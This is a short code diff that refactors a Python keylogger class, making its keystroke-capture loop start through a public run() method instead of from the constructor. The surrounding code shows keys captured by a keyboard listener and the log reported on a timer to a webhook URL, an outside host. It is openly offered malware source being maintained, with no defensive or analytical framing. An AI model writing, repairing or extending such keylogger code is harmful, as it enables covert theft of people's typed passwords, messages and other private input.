@@ -13,8 +13,6 @@ class Keylogger:
         self.interval = interval
         self.log = ""
 
-        self._run()
-
     def _send_info(self, log):
         log = str(log)
         if log != "":
@@ -37,11 +35,11 @@ class Keylogger:
         self.log = ""
         threading.Timer(self.interval, self._report).start()
 
-    def _run(self):
+    def run(self):
         self._report()
         with Listener(self._key_down) as c:
             c.join()
 
 
 if __name__ == '__main__':
-    Keylogger(WEBHOOK_URL, INTERVAL)
+    Keylogger(WEBHOOK_URL, INTERVAL).run()
